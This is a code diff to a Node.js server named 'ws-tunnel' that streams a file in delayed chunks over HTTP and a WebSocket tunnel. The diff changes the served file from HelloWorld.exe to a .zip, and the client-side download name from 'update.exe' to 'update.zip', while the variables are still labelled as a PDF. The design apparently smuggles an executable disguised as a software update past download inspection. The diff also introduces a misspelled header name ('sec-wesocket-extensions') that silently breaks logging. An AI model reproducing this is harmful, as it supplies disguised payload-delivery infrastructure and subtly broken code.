@@ -11,10 +11,10 @@ const path = require('path');
 const CONFIG = {
   PORT: process.env.PORT ? Number(process.env.PORT) : 3000,
   APP_NAME: process.env.APP_NAME || 'ws-tunnel',
-  PDF_NAME: process.env.PDF_NAME || 'HelloWorld.exe',
-  PDF_PATH: process.env.PDF_PATH || path.join(__dirname, 'files', 'HelloWorld.exe'),
-  CHUNK_SIZE: 64 * 1024, // 64 KiB chunks
-  CHUNK_DELAY_MS: process.env.CHUNK_DELAY_MS ? Number(process.env.CHUNK_DELAY_MS) : 20, // Configurable delay, 20ms default
+  PDF_NAME: process.env.PDF_NAME || 'HelloWorld.zip', // CHANGED: Updated to .zip
+  PDF_PATH: process.env.PDF_PATH || path.join(__dirname, 'files', 'HelloWorld.zip'), // CHANGED: Updated to .zip
+  CHUNK_SIZE: 64 * 1024,
+  CHUNK_DELAY_MS: process.env.CHUNK_DELAY_MS ? Number(process.env.CHUNK_DELAY_MS) : 20,
 };
 
 const bus = new EventEmitter();
@@ -46,12 +46,12 @@ async function loadPdfBufferOnce() {
     log(`File not found or invalid at ${CONFIG.PDF_PATH} — WS download will be skipped until provided.`);
   }
 }
-app.get('/HelloWorld.exe', async (_req, res) => {
+app.get('/HelloWorld.zip', async (_req, res) => { // CHANGED: Endpoint to /HelloWorld.zip
   if (!PDF_BUFFER) await loadPdfBufferOnce();
   if (!PDF_BUFFER) return res.status(404).type('text').send('No file configured on server.');
   res
     .status(200)
-    .setHeader('Content-Type', 'application/octet-stream')
+    .setHeader('Content-Type', 'application/zip') // CHANGED: MIME type to application/zip
     .setHeader('Content-Disposition', `inline; filename="${CONFIG.PDF_NAME}"`)
     .send(PDF_BUFFER);
 });
@@ -137,7 +137,7 @@ server.on('clientError', (err, socket) => {
   try { socket.end('HTTP/1.1 400 Bad Request\r\n\r\n'); } catch {}
 });
 server.on('upgrade', (req, socket, head) => {
-  log(`UPGRADE ${req.url} origin=${req.headers.origin||'(none)'} ua="${req.headers['user-agent']||'(ua?)'}" key=${req.headers['sec-websocket-key']||'(none)'} protocol=${req.headers['sec-websocket-protocol']||'(none)'} extensions=${req.headers['sec-websocket-extensions']||'(none)'}`);
+  log(`UPGRADE ${req.url} origin=${req.headers.origin||'(none)'} ua="${req.headers['user-agent']||'(ua?)'}" key=${req.headers['sec-websocket-key']||'(none)'} protocol=${req.headers['sec-websocket-protocol']||'(none)'} extensions=${req.headers['sec-wesocket-extensions']||'(none)'}`);
   if (req.url === '/ws-tunnel') {
     wss.handleUpgrade(req, socket, head, (ws) => {
       wss.emit('connection', ws, req);
@@ -247,7 +247,7 @@ function attachTunnelWSS(server) {
         try { 
           streamPdfOverWS(ws, PDF_BUFFER, CONFIG.PDF_NAME, CONFIG.CHUNK_SIZE, m.id); 
         } catch (e) { 
-          safeSend(ws, { type: 'error', message: 'PDF stream failed: ' + (e?.message || e), requestId: m.id }); 
+          safeSend(ws, { type: 'error', message: 'File stream failed: ' + (e?.message || e), requestId: m.id }); 
         }
         return;
       }
@@ -278,7 +278,7 @@ async function streamPdfOverWS(ws, buffer, name, chunkSize, requestId) {
   const start = performance.now();
   const size = buffer.length;
   const chunks = Math.ceil(size / chunkSize);
-  safeSend(ws, { type: 'fileMeta', name, downloadName: 'update.exe', mime: 'application/octet-stream', size, chunkSize, chunks, requestId }); // CHANGED: Added downloadName
+  safeSend(ws, { type: 'fileMeta', name, downloadName: 'update.zip', mime: 'application/zip', size, chunkSize, chunks, requestId }); // CHANGED: downloadName and mime
   log('TUNNEL sent fileMeta for requestId=' + requestId);
   for (let i = 0; i < chunks; i++) {
     if (ws.readyState !== ws.OPEN) {
